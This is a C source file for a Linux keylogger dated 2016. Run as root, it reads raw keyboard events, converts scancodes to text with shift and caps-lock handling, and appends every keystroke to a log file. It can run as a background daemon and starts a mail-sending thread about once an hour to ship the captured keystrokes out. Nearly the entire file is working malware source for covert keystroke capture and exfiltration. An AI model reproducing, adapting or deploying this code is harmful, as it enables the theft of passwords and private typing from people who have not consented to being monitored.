/*
 * 2016 mahdi <meh.rati@yahoo.com>
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <getopt.h>
#include <linux/input.h>
#include <pthread.h>
#include <stdbool.h>
#include <sys/types.h>
#include <time.h>
#include "get_event_keyboard.h"
#include "change_task.h"
#include "table_key.h"
#include "clock.h"
#include "mail.h"

int main(int argc, char **argv)
{
	struct input_event ev;
	char choose;
	int option_index;
	int get_stream_key;
	bool daemon_mod = false;
	bool caps_pressed = false;
	bool shift_pressed = false;
	int re_send= -1;
    int readable = 1;
	char stream_path[128];
	char timestring[80];
	pthread_t pth1;
	char *log_file;
	FILE *log;

	log_file = "/var/log/MDkey_logger.log";
	log = stdout;

	static struct option long_options[] = {
		{"log file path", required_argument, NULL, 'l'},
		{"deamon", no_argument, NULL, 'd'},
		{"help", no_argument, NULL, 'h'},
		{0, 0, 0, 0}
	};

	while ((choose = getopt_long(argc, argv, "l:dh", long_options, &option_index)) != -1)
	{
		switch (choose) {
			case 'l':
				log_file = optarg;
				break;
			case 'd':
				daemon_mod = true;
				break;
			case 'h':
			printf(  " Keylogger V 1.0.0\n"
				 " Usage: [OPTION]...\n"
				 "  -l, --log-file <file>  write log to FILE (default=/var/log/Mkey_logger.log)\n"
				 "  -d, --deamon  run as deamon\n"
				 "  -h, --help    show this message\n"
				 "  \n");
				return EXIT_SUCCESS ;
		}
	}

	if ((getuid ()) != 0)
	{
		printf ("You are not root!!!\n");
		return EXIT_FAILURE;
	}

	if (log_file && strlen(log_file) != 1 && log_file[0] != '-' && log_file[1] != '\0')
	{
		if (!(log = fopen(log_file, "a")))
		{
			perror("fopen");

			return EXIT_FAILURE;
		}

		close(STDOUT_FILENO);
	}

    bzero(stream_path,128);

	if (get_path_keyboard(stream_path) == -1)
	{
		fprintf(stderr, "Can't find default event device.\n");

		return EXIT_FAILURE;
	}


	if ((get_stream_key = open(stream_path, O_RDONLY | O_NOCTTY)) < 0)
	{
		perror("open");
		fprintf(stderr, "Can't read your input device...\n");
		return EXIT_FAILURE;
	}

	if(daemon_mod)
	{
        change_task_to_background();
	}

    log_time_now(timestring);
    fprintf(log, "\n Starting keylogger: %s\n", timestring);
    bzero(timestring,80);
    clock_t start, end;
    start = clock();

	while (readable > 0)
	{
		readable = read(get_stream_key, &ev, sizeof(ev));

		if (ev.value == 1 && ev.type == 1) // Pressed a key
		{

			if(ev.code == 58) // Capslock = 58
				{
					if(caps_pressed)
					{
						caps_pressed = false;
					}
					else
					{
						caps_pressed = true;
					}
				}

			if(ev.code == 42 || ev.code == 54) // LShift = 42, RShift = 54
				{
					shift_pressed = true;
				}

			if (shift_pressed)
				{
					fprintf(log, "%s", shift_scancode_to_ascii[ev.code]);
				    fflush(log);
				}
			else if(caps_pressed)
				{
					fprintf(log, "%s", caps_scancode_to_ascii[ev.code]);
			    	fflush(log);
				}
			else
				{
					fprintf(log, "%s", scancode_to_ascii[ev.code]);
			     	fflush(log);

				}

			}
	 	   else if(ev.value == 0) // Released a key
            {
				  if(ev.code == 42 || ev.code == 54) // LShift = 42, RShift = 54
                    {
                        shift_pressed = false;
                    }
            }
		 if((((int) (end - start)) / CLOCKS_PER_SEC) >= 3600)//send mail every one hour
		    {

               log_time_now(timestring);

               fprintf(log, "\n Time: %s\n", timestring);

			   fflush(log);

			   start = clock();

               bzero(timestring,80);

			   re_send = pthread_create(&pth1, NULL, &send_mail, NULL);

               }

              end = clock();
	}
		     
		
    pthread_join( &pth1, NULL);
	fclose(log);
	close(get_stream_key);

	return EXIT_SUCCESS;
}
